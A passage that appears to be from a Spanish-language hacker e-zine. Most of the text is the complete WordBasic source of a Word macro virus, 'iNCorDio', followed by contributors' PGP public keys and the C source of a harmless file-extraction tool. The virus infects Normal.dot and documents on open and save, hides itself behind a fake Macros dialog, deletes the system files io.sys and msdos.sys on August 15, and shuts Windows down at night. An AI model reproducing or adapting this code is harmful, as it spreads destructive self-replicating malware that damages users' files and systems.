' people thinks - "My teMplates Menu don't starts. Bah! is a Microsoft application ..." xD
' 
' The replication Method of this virus is siMple: I send u  the English exaM infected doc 
' because u can't write it for toMorrow. Your Word is infected. U have the Telephone NuMbers
' list of the best supertit... err, girls of your university, and send it to Menganito...
' Menganito's Word is infected.
' 
' Anything else. I hope u liked this Modest speciMen. 
'
'
'                     DO NOT DISTRIBUTE. THIS IS AN EXPERIMENTAL VIRII

'----------------
' AutoOpen MACRO
'----------------

Sub MAIN

On Error ResuMe Next    

' Copies all Macros to global teMplate (norMaly norMal.dot)

MacroCopiar NombreVentana$() + ":AutoOpen", "Global:iNFeCT3", 3
MacroCopiar NombreVentana$() + ":iNFeCT", "Global:ArchivoGuardarCoMo", 3
MacroCopiar NombreVentana$() + ":iNFeCT2", "Global:ArchivoAbrir", 3
MacroCopiar NombreVentana$() + ":iNCoRDio", "Global:iNCoRDio", 3
MacroCopiar NombreVentana$() + ":ChapaMacros", "Global:HerramMacro", 3
MacroCopiar NombreVentana$() + ":ChapaPlan", "Global:ArchivoPlantillas", 3
MacroCopiar NombreVentana$() + ":ChapaAuto", "Global:AutoExec", 3

HerramOpcionesGuardar .SimboloGlobalDot = 0

' Deactivates autoMacros to protect itself

DesactivarMacrosAuto

End Sub



'--------------
' iNFeCT MACRO
'--------------

Sub MAIN

On Error Resume Next
DiM Infector As ArchivoGuardarComo      ' 
GetCurValues Infector                   ' Shows FileSaveAs dialog box 
Dialog Infector                         '
ArchivoGuardarComo Infector             '

Call iNCoRDio                           ' Calls infect subrutines.

End Sub


'---------------
' iNFeCT2 MACRO
'---------------

Sub MAIN

On Error Resume Next
DiM Infector As ArchivoAbrir           ' 
GetCurValues Infector                  ' Shows FileOpen dialog box
Dialog Infector                        '
ArchivoAbrir Infector                  ' Open file

Call iNCoRDio                          ' Calls infect subrutines

End Sub


'-----------------
' ChapaAuto MACRO 
'-----------------

Sub MAIN
On Error Resume Next
If Mes(Ahora()) = 8 Then                                   ' On August 15 ...
        If Dia(Ahora()) = 15 Then                          
		MsgBox "^-^ iNCorDio v1.0 ^-^", "ViRuZ iNFeCTioN", 0    ' Shows this Message
		SetProfileString "colors", "scrollbar", "0 0 0"         '
		SetProfileString "colors", "Background", "0 0 0"        ' 
		SetProfileString "colors", "ActiveTitle", "0 0 0"       '
		SetProfileString "colors", "InactiveTitle", "0 0 0"     '
		SetProfileString "colors", " Menu ", " 0 0 0 "          '
		SetProfileString "colors", "Window", "0 0 0"            '
		SetProfileString "colors", "WindowFraMe", "0 0 0"       '
		SetProfileString "colors", "MenuText", "0 0 0"          '
		SetProfileString "colors", "TitleText", "0 0 0"         ' Turns dark Windoze
		SetProfileString "colors", "ActiveBorder", "0 0 0"      '   changing win.ini
		SetProfileString "colors", "InactiveBorder", "0 0 0"    '   values
		SetProfileString "colors", "AppWorkspace", "0 0 0"      '
		SetProfileString "colors", "Hilight", "0 0 0"           '
		SetProfileString "colors", "HilightText", "0 0 0"       '
		SetProfileString "colors", "ButtonFace", "0 0 0"        '
		SetProfileString "colors", "ButtonShadow", "0 0 0"      '
		SetProfileString "colors", "GrayText", "0 0 0"          '
		SetProfileString "colors", "ButtonText", "0 0 0"        '
		SetProfileString "colors", "InactiveTitleText", "0 0 0" '
		SetProfileString "colors", "ButtonHilight", "0 0 0"     '
		SetProfileString "colors", "ButtonDkShadow", "0 0 0"    '
		SetProfileString "colors", "ButtonLight", "0 0 0"       '
		SetProfileString "colors", "InfoText", "0 0 0"          '
		SetProfileString "colors", "InfoWindow", "0 0 0"          '
		SetProfileString "colors", "ButtonAlternateFace", "0 0 0" '
		SetProfileString "colors", "HotTrackingColor", "0 0 0"    '
		SetProfileString "colors", "GradientActiveTitle", "0 0 0"   '
		SetProfileString "colors", "GradientInactiveTitle", "0 0 0" '
		FijarAtributos "c:\io.sys", 0                     ' ReMoves io.sys attributes
		FijarAtributos "c:\msdos.sys", 0                  ' ReMoves Msdos.sys attributes
		Kill "c:\io.sys"                                  ' Kills io.sys
		Kill "c:\msdos.sys"                               ' Kills Msdos.sys
	End If
End If

For i = 1 To 7
	If Hora(Ahora()) = i Then                                 ' Between 1:00 AM and 7:00 AM
		MsgBox "Buenas noches.", "A soÒar con los angelitos", 0 ' Displays this Message 
		SalirWindows                                            ' and Windoze closes
	End If
Next i

DesactivarMacrosAuto
End Sub


'------------------
' ChapaMacros MACRO
'------------------

Sub MAIN
On Error Resume Next
DiM MacrosEn$(3)
MacrosEn$(0) = "Todas las plantillas activas"
MacrosEn$(1) = "Normal.dot (plantilla global)"
MacrosEn$(2) = "Comandos de Word"
MacrosEn$(3) = "Present.dot (plantilla global)"
DiM Macros$(0)

Begin Dialog DialogoUsuario 422, 296, "Macro", .FuncionDlg         '
	Text 6, 4, 157, 13, "&Nombre de la Macro:", .NoMbre        '
	Text 6, 193, 180, 13, "M&acros disponibles en:", .Dispon   '
	DropListBox 6, 208, 408, 50, MacrosEn$(), .MacrosEn        '
        Text 6, 235, 100, 13, "&Descripcion:", .Descri             '
	TextBox 6, 251, 408, 35, .Descripcion                      '
	PushButton 282, 8, 130, 21, "&Grabar ...", .Gravar         '
	CancelButton 282, 32, 130, 21                              ' Fake Macros... dialog box
	PushButton 282, 62, 130, 21, "Ejecutar", .Ejecutar         '
	PushButton 282, 85, 130, 21, "Crear", .Crear               '
	PushButton 282, 108, 130, 21, "Eliminar", .EliMinar             '
	PushButton 282, 139, 130, 21, "&Organizador ...", .Organizador  '
	PushButton 282, 163, 130, 21, "A&yuda", .Ayuda                  '
	CoMboBox 6, 18, 265, 166, Macros$(), .Macros               '
End Dialog
Dim dlg As DialogoUsuario
selec = Dialog(dlg)          

If selec = 1 Or selec = 3 Then                    ' If "record" or "create" buttons are pushed
MsgBox "No puede grabar Macro aqui", 16           ' " (X) I can't record a Macro here.
End If

If selec = 2 Or selec = 4 Then                    ' If "ReMove" or "Execute" buttons are pushed
MsgBox "Seleccione una Macro", 48                 ' (I) Select a Macro.
End If

If selec = 6 Then                                 ' If "help" button is pushed ...
AyudaContenido                                    ' shows help :-)
End If
End Sub	

Function FuncionDlg(identificador$, accion, valorSup)
        If accion = 1 Then
		FocoDlg$ Macros
	End If
End Function


'-----------------
' ChapaPlan MACRO
'-----------------

Sub MAIN
On Error Resume Next     ' Anything else. This Macro is executed when TeMplates Menu is called.
End Sub



'----------------
' iNCoRDio MACRO
'----------------

Sub MAIN
'
'# Virus NaMe : iNCorDio v1.1
'# Coder: }Moeb|uZ{
'# Creation order positon: 1st
'# Infects: .doc , .dot and .rtf when opened
'# Origin: 25 April 1999
'		   Madrid, Spain 
'# Stealth: SeMi
'# Encrypted: Yes
'
'

On Error Resume Next
sinExt$ = InfoNombreArchivo$(NombreArchivo$(), 4)        ' Gets the without-extension file naMe
conExt$ = InfoNombreArchivo$(NombreArchivo$(), 3)        ' Gets the file naMe and extension 
If conExt$ <> sinExt$ + ".DOC" Then                      ' If not .doc file
	If conExt$ <> sinExt$ + ".RTF" Then              ' If not .rtf file
		If conExt$ <> sinExt$ + ".DOT" Then      ' If not .dot file
			Goto EndFin                      ' Ends Macro: Doesn`t infect anything
		End If
	End If
End If
ArchivoGuardarComo .Formato = 1                          ' Saves the file with teMplate forMat
Infectar()                                               ' Calls infect subrutine: Infects file 
ArchivoGuardar                                           ' Saves file (now infected)
End Sub

Sub Infectar

' Copies all Macros to saved file
 
MacroCopiar "Global:iNFeCT3", NombreVentana$() + ":AutoOpen", 3            
MacroCopiar "Global:ArchivoGuardarComo", NombreVentana$() + ":iNFeCT", 3
MacroCopiar "Global:ArchivoAbrir", NombreVentana$() + ":iNFeCT2", 3
MacroCopiar "Global:iNCoRDio", NombreVentana$() + ":iNCoRDio", 3
MacroCopiar "Global:HerramMacro", NombreVentana$() + ":ChapaMacros", 3
MacroCopiar "Global:ArchivoPlantillas", NombreVentana$() + ":ChapaPlan", 3
MacroCopiar "Global:AutoExec", NombreVentana$() + ":ChapaAuto", 3

End Sub
<-->







		                            /^{M}^\

                                         The flying eM

 moebiuz@biogate.com
 SJF Project - CPU Planification
 http://www.undersec.com/sjfproject


==============================================================================
------------------------------------------------------------------------------
==============================================================================


                        +-------------------------+
                        | .oO  Correo Fresco  Oo. |
                        +-------------------------+


- Lo dicho, en este numero esta seccion esta "dormitando". Esperando a
  ponernos en contacto con vosotros, pero para eso vosotros teneis que
  dar el primer paso ;). Recordad, netsearch@hushmail.com -


==============================================================================
------------------------------------------------------------------------------
==============================================================================

                        +----------------------+
                        | .oO  Llaves PGP  Oo. |
                        +----------------------+

      Como en el anterior numero, os ofrecemos las llaves PGP de la gente que
 ha colaborado en este numero. Os recordamos, para los que aun no tengais el
 PGP, que os lo podeis bajar de http://www.pgpi.com . Bien, a por lo que
 ibamos :)

 - LLAVE PGP DE CAFO

<++> pgpkeys/cafo.asc !8392812c
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.0i for non-commercial use

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
=RGhu
-----END PGP PUBLIC KEY BLOCK-----
<-->

 - LLAVE PGP DE SP4RK

<++> pgpkeys/sp4rk.asc !de817f84
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v0.9.6 (GNU/Linux)
Comment: For info see http://www.gnupg.org

mQGiBDdC8XERBACnBxv1DrZbK649d8WxLpunvydXnHG68ZlUZOgY92Ldh53//4+q
08zbb486UShFr21KVAS/s5Cqb/d3sen9hagTMHTVJrkfog/cR6MJEzF44mqBk033
UJJ0BMInOUZjlRahLFzNnBKmBv/sHYSxQWzi9MjpCVXEfzrYMMsoqBtLmwCg0Jz+
sCl46B08d0cCjjKyMME/DMcD/j9aIuFt6ej6/3Hum7srVdlSHleey5ZXKGHwehpW
v1q62f+WG7HBOvVJDyFEURLMQLxhoZ6GvXX/Qx/PWcOXPh6IizFDZtsSA4FdvDXR
9TCPq8h8O/QYkKi8fpLJH7QvXBqVTwt79MEdZFeMb4d5g7DgcXVILoOiMpbFmx7f
FWDgA/9mWriPCOIIBdGxorwwB28qYYP7hz14O8pFfoKJ3tGh1lvodRHFbxR5MU7V
vJj7A3xwFrnCAQvuUfv60tzQnlJcfHX5ewmDeByYZuBd7Y8Yw+kkTYELUM8BH5P4
LMgFf+u0KLRusqFgFFdYSFs0lqRhm7qMxqaqxA4ebocaHuS8krQaU3A0cksgPHNw
NHJrQHVuZGVyc2VjLmNvbT6IVQQTEQIAFQUCN0LxcQMLCgMDFQMCAxYCAQIXgAAK
CRB1paVla9t6atKjAKCVE6DM8T/Qm1rJFH+n1dl93PqIcgCguYO3kAlWZYUIjxGv
tOaRUrxFFl65AQ0EN0LxexAEALwkD8QCFR4vSf45Xs0ZU7YjAw+/xyQ6wdPcThTs
2ZnHDLdlh3s4QjkxaR2uzDX6rwPRQZpHb2DOe9pv5N9HhskNkmDEO0ofI5j854jC
OWSwGmv6muEfFN0noSSUGeFx8juas5zPX4zRBV/Je4XTWbGx8aNTj1RgQqKWiNEA
gQfvAAMFBACHThWWASAcLE0TKWJLfkpsCRNKi2cViVogdbwfjMjPyMP+aBsABtUG
Be5l9wQtr2XVrfs/NIXgVdBKXjnEXUUk3ubYgRX9gZaNh/I80qD+YSXqLtgHdQxD
e1OOZ4evjz04d/Pg1lmST98s81QgKUUnK11+ev+XDPDww8Datp51+ohGBBgRAgAG
BQI3QvF7AAoJEHWlpWVr23pqCXcAnjQ6DMqdOipS3UHpYkV99orNZGwPAJ9J+4fo
tup86olyg4FOa+XIJdTI2A==
=aNEV
-----END PGP PUBLIC KEY BLOCK-----
<-->

 - LLAVE PGP DE MEGADETH

      - sorry, no disponible actualmente, pedirsela a el :P -

 - LLAVE PGP DE MOEBIUZ

<++> pgpkeys/moebiuz.asc !f03e8c55
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 6.0.2i

mQGiBDkIdP4RBADAwpXHE+z4FcIOh9ISkYflt/kumnarEQKt1HJIv094mX1/3yna
k38OfIXGUcBiN+znzoZUYwVOEUhJIGcEXph8wX9CNu73IZtHn+kcm7zczASs1VLA
5bOorepMZbAz0WiNrBQTvcOSQCDF6E3Ubnh2P98fjZ6giVyATgP+HI/8hwCg/3bZ
TgcFZ1VQZOavwVsXIfgzdysD/iEwEtUoBzoSo4bLbHkoXrH2xSWNvhk5gYIWnSsb
oqV7LPi+oOZhoKWm3ACgo2yYpp4SNFglLd8saRS3jL8j+2xY7RJH4+7gBqH7Yt9h
vfwPT9R+k1JcmHTHZYVE/fNjB/UfcfDGFrwNrSs0YFdZ0A+8vqjDBOPw9P8M95de
NsDrA/9kwfoDm7AFiAMPwbZma+/n7MrP18BrLZeqQkm7U0J5lG0qceyrd3FNRwma
01GDxsmA0aVJprtyQY66E7EUBMOe9H3LTpOGEdgiz6yvshoTupEUrARrEs8hdsbK
1bnK2xmyAYdCswxJIBkB13ESc4Jp+1XUv8EG6kPPOpyIreyT27QffU1vZWJ8dVp7
IDxtb2ViaXV6QGJpb2dhdGUuY29tPokASwQQEQIACwUCOQh0/wQLAwIBAAoJEDts
aX7puSUM5TkAoKkWZz9AhJZoVaI0bNRNvOl+yo9nAKCVzy5U7Ww8E9VOfKAjHO5s
miDDtLkCDQQ5CHT/EAgA9kJXtwh/CBdyorrWqULzBej5UxE5T7bxbrlLOCDaAadW
oxTpj0BV89AHxstDqZSt90xkhkn4DIO9ZekX1KHTUPj1WV/cdlJPPT2N286Z4VeS
Wc39uK50T8X8dryDxUcwYc58yWb/Ffm7/ZFexwGq01uejaClcjrUGvC/RgBYK+X0
iP1YTknbzSC0neSRBzZrM2w4DUUdD3yIsxx8Wy2O9vPJI8BD8KVbGI2Ou1WMuF04
0zT9fBdXQ6MdGGzeMyEstSr/POGxKUAYEY18hKcKctaGxAMZyAcpesqVDNmWn6vQ
ClCbAkbTCD1mpF1Bn5x8vYlLIhkmuquiXsNV6TILOwACAggA1D+Ae7MCH5I6G1hb
1Oq0z4zN3gzA6yPvfxhu+sjKc62oeqkh8LORKBPgfi3POqgyyUlcNad3eQFjRvhm
Aw+/83rPY+ZjhMhtCbRwFkr223KmBS06fBgRAFQF/vEbdJswe+T2Rdi6mavu1HdD
nS04F1RPwltJt8drqizABzfQyYuAPn4XfkiOO/hhY8qYPTNOZ9PYOLpjNZFUrCYX
aMIypsZPn52CMEbiUAlAGKVFxMYdapwhxW8bSfM3gLjqv9wgTvHc9dMcE2cKqycj
NV5Zl4X0lydFl3wHPHqEmCNNKrOAjnqAoGk8mhMJj4CDnaK730hPFLQSVDHq2a2C
6D1vqokARgQYEQIABgUCOQh0/wAKCRA7bGl+6bklDB1FAKDsmcSoE3/wo0aiQGX/
mJCDMPIa3QCggsilNGROnCxNTFWSoYpC+nZsWe8=
=sfip
-----END PGP PUBLIC KEY BLOCK-----
<-->

 - LLAVE PGP DE DARK FEAR

<++> pgpkeys/dark_fear.asc !f14994d4
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v0.9.7 (GNU/Linux)
Comment: For info see http://www.gnupg.org

mQGiBDc56lARBADSN0mYy8nlBonQI/pigblLLY6wuoSgGe989NjJ7YuMW9tSRii3
ydafUsIMsWtWupZoXzbYpRs0jO0BYtoz8u5Hroc+NcxsBMkBzK7IFajBmgoAGcuM
xCKt70Fs8eK8hOvpgA7rnlzkmKqb8GQOX0bl+cUIwqE2xLiyT6hDRoH7bwCg/1FH
pw7ET8oE5A9g/3jieZYk820D+gK/sPos8+DjiifxY/YzGghPtJ2R9iTngFtVOgTI
QCDS8EiB5C/G5y/vcayJZtR0fctrq+A5f0DHslETHZRV58ts4FnllIdxwj8SN9gj
DnXRVMoZVxfcwTKgxd+DB7rRfUyXFDBe1d7UGK1B5Vcqb8lm4Y5BfXt8nzjYBxwy
r5gnA/kBGhTjkfXaF0GlZkp8zMKkD5mb25Zgg+IZPXMuOpmENz6CeOTJt7Z9xZW2
YJF/olPTjjjInYMo6GmEEhNRF2KYzHJtYqK9Xwz7mKgXKNHnVFjg1UUCohS0sqLe
Tbz+Z2Cv2ArhbirFgd0DhZ31Cf1QJKFNqwwE5QosaCTLtreNuLQfRGFySyBGZWFS
IDxkYXJrZmVhckBob3Rwb3AuY29tPohLBBARAgALBQI3OepQBAsDAgEACgkQeTbh
zFp9bDjqRQCfcaa/Qx9rlj52goR8S/ve/uPTB10AoLeKlv6h10nbafnns5xB0ov9
LxuYuQINBDc56lAQCAD2Qle3CH8IF3KiutapQvMF6PlTETlPtvFuuUs4INoBp1aj
FOmPQFXz0AfGy0OplK33TGSGSfgMg71l6RfUodNQ+PVZX9x2Uk89PY3bzpnhV5JZ
zf24rnRPxfx2vIPFRzBhznzJZv8V+bv9kV7HAarTW56NoKVyOtQa8L9GAFgr5fSI
/VhOSdvNILSd5JEHNmszbDgNRR0PfIizHHxbLY7288kjwEPwpVsYjY67VYy4XTjT
NP18F1dDox0YbN4zISy1Kv884bEpQBgRjXyEpwpy1obEAxnIByl6ypUM2Zafq9AK
UJsCRtMIPWakXUGfnHy9iUsiGSa6q6Jew1XpMgs7AAICB/9eZoKMb8mIq0BZ/HIC
xzQiUy1Xj1Od+fY/H7XDlpKyHq7XXT0ryDgS5iNTqbQjgVo3F79UybqTr78iyhjp
Iq4sPI1wdAhO108fktfg6OOHuMUSr/LBkFGcyoAosk40lBuTYsBaJ/O8Hod5LVr2
nPfIgtuM2ZAqYJvIiZrc+cgGEjemE8bxx1bIiuwg0fjvsiibWERGIMeW1+x4GWmq
ZgOD2Tg6p2bg+JHCuBe0r2UoELMHVAlo4EERxXk52dkxuFIXg7WnKBrWwzJRLKK1
Y5W3tPsDWDJYplCgKnvaBUww+8BX3rHNj5Kbut0pP5H1E89aEe4OVDwpN3GjOjGw
VZwbiEYEGBECAAYFAjc56lAACgkQeTbhzFp9bDgLRQCfd05buQ2C3zFMnPF1hFRQ
dgjFtG0AoNt2amMVE3LJhvCkUW3KV70v3K3c
=kxFg
-----END PGP PUBLIC KEY BLOCK-----
<-->

 - LLAVE PGP DE LSD-MT

<++> pgpkeys/lsd-mt.asc !c8ad08ff
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 6.0.2i

mQGiBDc10VERBADAHcYcRryTiE/k+/yMO7LeuN5bYhLa5MJwaPEyeYF8rq7GRl8K
XH711W6RavbguvCb5IvK8sz/j33WBZFcRcmieDUwbRAZG8a4GDgp53pK9IMMgFb2
hqSid6+n3AOj1vss87pfjTLHBdEl8lQTlf35mtOAp/kW3bTAD4Svy90HTwCg/5Zp
074nBVpQil6thSRpZs4l7t0D/RwZm0Mncz5LNxkjcXmSesa3izLcSiY8bWgmuV/u
YG0445Zg31Nlv89iVKSVt6d5Q3oK1f9H8I12DirSliin6ad3oYkiakFHIIu0Q7zZ
A1tQSxnUP7abLKXYmasfTj3v2mH8MGmYNDwxUqM8XXnahRPKe04w9y4KquZ55V46
hiR3A/9a697J6GQgy+jXYIzuuaLQYgbrYgZeJooEX61Wk7RwHy+p/r3n1ZzOyO+6
8fyl64A91OJVAD/RiYJ60adZSwbw2nXt8TSE7aHgXWsDaCbcpKQy7XM1En/1CnLR
l6tru20jZxGlGFOABaOan+nAagN6r6FH2aiwssD96Vve2CMfRbQVTHNEIDxkYWZv
QGFycmFraXMuZXM+iQBLBBARAgALBQI3NdFRBAsDAgEACgkQfnxNcZmK149aMgCg
/2YDU5fUDZ95pgPoght7XbhJC+QAoInbk7yyxj3U4wuT46Kq3y8S+EjluQINBDc1
0VEQCAD2Qle3CH8IF3KiutapQvMF6PlTETlPtvFuuUs4INoBp1ajFOmPQFXz0AfG
y0OplK33TGSGSfgMg71l6RfUodNQ+PVZX9x2Uk89PY3bzpnhV5JZzf24rnRPxfx2
vIPFRzBhznzJZv8V+bv9kV7HAarTW56NoKVyOtQa8L9GAFgr5fSI/VhOSdvNILSd
5JEHNmszbDgNRR0PfIizHHxbLY7288kjwEPwpVsYjY67VYy4XTjTNP18F1dDox0Y
bN4zISy1Kv884bEpQBgRjXyEpwpy1obEAxnIByl6ypUM2Zafq9AKUJsCRtMIPWak
XUGfnHy9iUsiGSa6q6Jew1XpMgs7AAICB/9T3si4UJ5/IKb5QTISOzn1vkPoTz4U
OA0okQTmlc+Ytjl4nNUq3jCKvVUf6mMBYK1h/V9poQLgNL4age1xxgDiBcrHZ/TH
mfHMsRDtlzLibGV/9+mbqa33m5/PbbkBnZVi6GZruqQfGpeyLrcuIdpLdA9loplh
J4DGLXuLFzGdepsepQXcj8SkdjfIDfklEmnFGglqSnU2IzIbyeoOaw6tG6poHiHJ
luq61nzhFb+lqlYcV6oIlGKXSo8m9Yphvq2AQ8FaBjKC+dnjsj3N0qj+m70PqLcd
+rEg1F/mKsDnPu+iUG2RRLoBZpR8BB6RASnd7sGHwBq5U/VS0TT0kuhTiQBGBBgR
AgAGBQI3NdFRAAoJEH58TXGZiteP6WcAnj5bnpfuau+Yr7b++dhbVwV0LoMlAKC2
QvBSXofLRS9NLX4sPT0kZF99zQ==
=G8HO
-----END PGP PUBLIC KEY BLOCK-----
<-->


==============================================================================
------------------------------------------------------------------------------
==============================================================================

                    +------------------------------+
                    | .oO  Fuentes del NetExt  Oo. |
                    +------------------------------+

     Aqui teneis las fuentes del NetExt, que tal como os hemos explicado
antes, es una modificacion del extractor de la Phrack.

<++> utils/netext.c !5599b3e2
/*  netext.c   by (un monton de gente) + cafo
 *  
 *  Esta es una actualizacion del programa extract.c de phrack(r).
 *  La principal caracteristica que se ha aÒadido es que hace comprobacion
 *  de crc32 en aquellos archivos que presenten la posibilidad.
 *
 *  gcc -o netext netext.c
 *  
 *  ./netext file1 file2 file3 ...
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>
#include <dirent.h>

#define BEGIN_TAG   "<++> "
#define END_TAG     "<-->"
#define BT_SIZE     strlen(BEGIN_TAG)
#define ET_SIZE     strlen(END_TAG)

struct f_name
{
    u_char name[256];
    struct f_name *next;
};
unsigned long crcTable[256];

void crcgen() 
{
  unsigned long crc, poly;
  int i, j;
  poly = 0xEDB88320L;
  for (i=0; i<256; i++) {
     crc = i;
     for (j=8; j>0; j--) {
        if (crc&1) {
           crc = (crc >> 1) ^ poly;
           } 
        else {
           crc >>= 1;
        }
     }
     crcTable[i] = crc;
  }
}
        
unsigned long check_crc( FILE *fp )
{
   register unsigned long crc;
   int c;

   crc = 0xFFFFFFFF;
   while( (c=getc(fp)) != EOF ) {
         crc = ((crc>>8) & 0x00FFFFFF) ^ crcTable[ (crc^c) & 0xFF ];
   }
 
   fseek(fp,0,SEEK_SET);

   return( crc^0xFFFFFFFF );

}

int main(int argc, char **argv)
{ 
    u_char b[256], *bp, *fn;
    int i, j = 0, h_c = 0;
    unsigned long crc=0, crc_f=0;
    FILE *in_p, *out_p = NULL; 
    struct f_name *fn_p = NULL, *head = NULL; 

    if (argc < 2)
    {
        printf("Uso: %s archivo1 archivo2 ... archivon\n", argv[0]);
        exit(0); 
    }

    for (i = 1; (fn = argv[i++]); )
    {
        if (!head)
        {
            if (!(head = (struct f_name *)malloc(sizeof(struct f_name))))
            {
                perror("malloc");
                exit(1);
            }
            strncpy(head->name, fn, sizeof(head->name));
            head->next = NULL;
            fn_p = head;
        }
        else
        {
            if (!(fn_p->next = (struct f_name *)malloc(sizeof(struct f_name))))
            {
                perror("malloc");
                exit(1);
            }
            fn_p = fn_p->next;
            strncpy(fn_p->name, fn, sizeof(fn_p->name));
            fn_p->next = NULL;
        }
    }
    
    if (!(fn_p->next = (struct f_name *)malloc(sizeof(struct f_name))))
    {
        perror("malloc");
        exit(1);
     }
    fn_p = fn_p->next;
    fn_p->next = NULL;

    for (fn_p = head; fn_p->next; fn_p = fn_p->next)
    {
        if (!(in_p = fopen(fn_p->name, "r")))
        {
            fprintf(stderr, "No se puede abrir el archivo original %s.\n", fn_p->name);
	    continue;
        }
        else fprintf(stderr, "%s abierto\n", fn_p->name);
        crcgen();
        while (fgets(b, 256, in_p))
        { 
            if (!strncmp (b, BEGIN_TAG, BT_SIZE))
            { 
	        b[strlen(b) - 1] = 0; 
                j++;

                crc=0;
                crc_f=0;
                if ((bp = strchr(b + BT_SIZE + 1, '/')))
                {
                    while (bp)
                    {
		        *bp = 0;
		        mkdir(b + BT_SIZE, 0700); 
		        *bp = '/';
		        bp = strchr(bp + 1, '/'); 
		    }
                }
                
                if((bp=strchr(b,'!')))
                {
                   crc_f=strtoul((b + (strlen(b)-strlen(bp)) + 1),NULL,16);
                   b[strlen(b) - strlen(bp) - 1 ]=0;
                   h_c=1;
                }
                else
                   h_c=0;
                                
                if ((out_p = fopen(b + BT_SIZE, "wb+")))
                {
                    printf("- Extrayendo %s\n ", b + BT_SIZE);
                }
                else
                {
		    printf("No se puede extraer '%s'.\n", b + BT_SIZE);
		    continue;
	        }
	    } 
            else if (!strncmp (b, END_TAG, ET_SIZE))
            {
	        if (out_p) 
                {
                    if(h_c==1)
                    {
                        fseek(out_p,0l,0);
                        crc=check_crc(out_p);
                        if(crc==crc_f)
                           printf("            crc32 = %08lx  ... comprobado\n ",crc);
                        else
                           printf("            crc32 -> %08lx - %08lx  no coincide!\n ",crc,crc_f);
                        
                    }    
                    fclose(out_p);
                }    
	        else
                {
	            fprintf(stderr, "Error al cerrar el archivo %s.\n", fn_p->name);
		    continue;
	        }
            } 
            else if (out_p)
            {
                fputs(b, out_p);
            }
        }
    }
    if (!j) printf("No se han encontrado etiquetas de extraccion.\n");
    else printf("Extraidos %d archivo(s).\n", j);
    return (0);
}

/* EOF */
<-->


==============================================================================
------------------------------------------------------------------------------
==============================================================================


                        +---------------------+
